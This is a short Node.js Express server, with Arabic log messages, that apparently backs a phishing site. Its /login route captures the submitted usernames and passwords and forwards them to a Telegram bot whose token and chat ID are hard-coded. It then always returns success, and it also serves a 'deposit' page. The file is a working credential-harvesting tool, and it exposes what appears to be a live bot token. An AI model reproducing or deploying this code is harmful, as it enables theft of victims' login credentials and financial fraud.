const express = require('express');
const path = require('path');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8772797427:AAFLsQQMMiBUlZrxSESBU34JDVTHFAI06-w';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6664763520';

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const message = `🔔 بيانات دخول جديدة:\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });
        console.log("✅ تم الإرسال إلى Telegram:", username);
    } catch (error) {
        console.error("❌ خطأ في الإرسال لتلجرام:", error.message);
    }

    res.status(200).json({ success: true });
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/deposit', (req, res) => res.sendFile(path.join(__dirname, 'deposit.html')));

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => console.log(`السيرفر جاهز على المنفذ ${PORT}`));
